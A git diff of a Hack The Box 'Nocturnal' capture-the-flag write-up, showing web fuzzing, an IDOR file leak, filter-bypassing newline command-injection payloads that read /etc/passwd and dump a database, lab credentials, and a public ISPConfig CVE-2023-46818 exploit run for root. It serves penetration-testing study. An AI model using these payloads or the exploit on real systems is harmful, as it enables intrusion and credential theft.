@@ -1,25 +1,26 @@
 ---
 sticker: emoji//1f303
 ---
+# ENUMERATION
+---
 
-# NOCTURNAL
 
-## ENUMERATION
 
-***
+## OPEN PORTS
+---
 
-### OPEN PORTS
-
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | SSH     |
 | 80   | HTTP    |
 
-## RECONNAISSANCE
 
-***
+
+
+# RECONNAISSANCE
+---
+
 
 We need to add `nocturnal.htb` to `/etc/hosts`:
 
@@ -27,11 +28,14 @@ We need to add `nocturnal.htb` to `/etc/hosts`:
 echo 'IP nocturnal.htb' | sudo tee -a /etc/hosts
 ```
 
+
 We can check the following:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250414131950.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250414131950.png)
 
 We can begin fuzzing:
+
 
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://nocturnal.htb/FUZZ" -ic -c -t 200 -e .php,.html,.xml
@@ -71,7 +75,7 @@ dashboard.php           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 106
 
 Got a few interesting directories, for example, the `view.php` seems weird, if we check it up, we find this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250414133917.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250414133917.png)
 
 It means we need a parameter, let's fuzz for parameters, I will use `arjun` for this, we can install it using:
 
@@ -130,7 +134,7 @@ tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Durat
 
 We found some users, for example, the `amanda` and `tobias` usernames seems weird, knowing the usernames, we can now check the url again and use the username:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250414145432.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250414145432.png)
 
 Still getting the invalid file extension, if we remember them right, we can use any of them:
 
@@ -140,7 +144,8 @@ http://nocturnal.htb/view.php?username=amanda&file=.pdf
 
 We get this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250414145506.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250414145506.png)
 
 There is a hidden file inside: `privacy.odt`, we can download it:
 
@@ -161,13 +166,15 @@ In order to extract a `.odt` file, we can use:
 unzip privacy.odt -d privacy_content
 ```
 
+
 We get this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250414145630.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250414145630.png)
 
 If we check content.xml, we can see the following:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250414145723.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250414145723.png)
 
 There we go, we got credentials for `amanda`:
 
@@ -177,21 +184,27 @@ amanda:arHkG7HAI68X8s1J
 
 These credentials only work in the web application, not on ssh, let's proceed with exploitation.
 
-## EXPLOITATION
 
-***
+
+
+
+# EXPLOITATION
+---
+
 
 If we log with the credentials we got, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250414145853.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250414145853.png)
+
 
 We got a `nocturnal_database.db.pdf` file, we can try checking it first:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250414150119.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250414150119.png)
 
 It seems like there's a hidden database, I tried getting it with curl but it does not work, let's proceed to the admin panel:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250414150944.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250414150944.png)
 
 We are able to create backups on here, I tried creating a backup to check if the database was in here but it wasn't, an interesting founding I got was when I read the source code for `admin.php`, we can see this:
 
@@ -457,7 +470,7 @@ if (isset($_POST['backup']) && !empty($_POST['password'])) {
 </html>
 ```
 
-There's a critical vulnerability in this code, the `cleanEntry` function filters out dangerous characters (`;`, `&`, `|`, `$`, , `` ` ``, `{`, `}`, `&&`), but **newlines ()** and **tabs ()** are allowed. The `$password` is directly inserted into a shell command without proper quoting, enabling command injection via newlines.
+There's a critical vulnerability in this code, the `cleanEntry` function filters out dangerous characters (`;`, `&`, `|`, `$`, , `` ` ``, `{`, `}`, `&&`), but **newlines (`\n`)** and **tabs (`\t`)** are allowed. The `$password` is directly inserted into a shell command without proper quoting, enabling command injection via newlines.
 
 After testing some payloads, I was able to exploit the `id` command with the following:
 
@@ -465,7 +478,7 @@ After testing some payloads, I was able to exploit the `id` command with the fol
 password=%0Abash%09-c%09"id"%0A&backup=Create+Backup
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250414172644.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250414172644.png)
 
 I tried getting a shell at this point but was unable to do it, it seems the server kind of interpret the input but is unable to get us a shell, let's look around the machine, if we remember correctly, there's a `nocturnal_database.db` file at `/nocturnal_database`, if we check the contents of this directory, we can find this:
 
@@ -473,7 +486,7 @@ I tried getting a shell at this point but was unable to do it, it seems the serv
 password=%0Abash%09-c%09"ls%09-la%09/var/www/nocturnal_database"%0A&backup=Create+Backup
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250414172837.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250414172837.png)
 
 There it is, we can use `base64` to get the file into our local machine:
 
@@ -481,9 +494,10 @@ There it is, we can use `base64` to get the file into our local machine:
 password=%0Abash%09-c%09"base64%09/var/www/nocturnal_database/nocturnal_database.db"%0A&backup=Create+Backup
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250414172949.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250414172949.png)
 
 We need to copy the content of it and do:
+
 
 ```
 echo 'BASE64 STRING' | base64 -d > nocturnal_database.db
@@ -491,7 +505,7 @@ echo 'BASE64 STRING' | base64 -d > nocturnal_database.db
 
 With this, we can now analyze the file using `sqlitebrowser`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250414173043.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250414173043.png)
 
 We see some hashes, we can try using the command injection to check which user has a bash console, since cat is disabled with this, we can try head:
 
@@ -499,11 +513,13 @@ We see some hashes, we can try using the command injection to check which user h
 password=%0Abash%09-c%09"head%09-n%0950%09/etc/passwd"%0A&backup=Create+Backup
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250414173258.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250414173258.png)
 
 Seems like the user we need is `tobias`, let's crack the hash, it is a simple `md5` hash:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250414173336.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250414173336.png)
+
 
 There we go, we finally got credentials:
 
@@ -513,13 +529,13 @@ tobias:slowmotionapocalypse
 
 We can go to ssh with these:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250414173415.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250414173415.png)
 
 Let's go with privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+# PRIVILEGE ESCALATION
+---
 
 We can read user flag now:
 
@@ -530,7 +546,7 @@ tobias@nocturnal:~$ cat user.txt
 
 We can use `linpeas` to check for any PE vector:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250414174019.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250414174019.png)
 
 Seems weird, if we keep analyzing the output from linpeas, we can see something called `ispconfig`, since we got another website open, let's use port forwarding to check the contents of it:
 
@@ -538,15 +554,15 @@ Seems weird, if we keep analyzing the output from linpeas, we can see something 
 ssh tobias@nocturnal.htb -L 9090:127.0.0.1:8080
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250414174209.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250414174209.png)
 
 There we go, we are dealing with something called `ISPCONFIG`, we can try checking the version in the source code:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250414174241.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250414174241.png)
 
 So, `ispconfig 3.2`, let's search for an exploit:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250414174330.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250414174330.png)
 
 We got `CVE-2023-46818`, let's search an exploit and use it:
 
@@ -554,7 +570,7 @@ We got `CVE-2023-46818`, let's search an exploit and use it:
 EXPLOIT: https://github.com/bipbopbup/CVE-2023-46818-python-exploit
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250414174412.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250414174412.png)
 
 Let's get it, we need to do this:
 
@@ -564,7 +580,7 @@ python exploit.py http://127.0.0.1:9090 admin slowmotionapocalypse
 
 We can see this output:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250414174551.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250414174551.png)
 
 There we go, we can finally read root shell and finish the CTF.
 
@@ -574,3 +590,5 @@ ispconfig-shell# cat /root/root.txt
 ```
 
 https://www.hackthebox.com/achievement/machine/1872557/656
+
+
